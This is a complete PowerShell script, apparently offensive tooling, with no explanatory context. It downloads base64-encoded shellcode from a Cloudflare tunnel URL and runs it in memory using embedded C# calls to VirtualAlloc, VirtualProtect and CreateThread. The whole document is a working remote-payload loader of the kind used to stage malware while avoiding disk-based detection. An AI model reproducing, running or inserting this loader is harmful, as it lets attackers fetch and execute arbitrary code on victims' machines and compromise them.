$u="https://mandatory-zip-installing-illinois.trycloudflare.com/payloads/shellcode.txt?key=57c36cda7fe1823797273b065ea3b8f8"
[Net.ServicePointManager]::SecurityProtocol="Tls12"
Write-Host "[*] Downloading shellcode..."
try{$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u));Write-Host "[+] Got $($sc.Length) bytes"}catch{Write-Host "[-] Download failed: $_";return}

$c=@"
using System;using System.Runtime.InteropServices;
public class W{
    [DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);
    [DllImport("kernel32.dll",SetLastError=true)]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
    [DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,out uint i);
    [DllImport("kernel32.dll")]public static extern uint WaitForSingleObject(IntPtr h,uint t);
}
"@
Add-Type $c

$mem=[W]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]::new([uint64]$sc.Length),0x3000,0x04)
if($mem -eq [IntPtr]::Zero){Write-Host "[-] VirtualAlloc failed";return}
Write-Host "[+] Allocated at 0x$($mem.ToString("X"))"

[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$mem,$sc.Length)
Write-Host "[+] Copied shellcode"

$o=[uint32]0
[W]::VirtualProtect($mem,[UIntPtr]::new([uint64]$sc.Length),0x20,[ref]$o)|Out-Null
Write-Host "[+] Set RX"

$t=[uint32]0
$th=[W]::CreateThread([IntPtr]::Zero,0,$mem,[IntPtr]::Zero,0,[ref]$t)
Write-Host "[+] Thread $t started!"
[W]::WaitForSingleObject($th,0xFFFFFFFF)|Out-Null
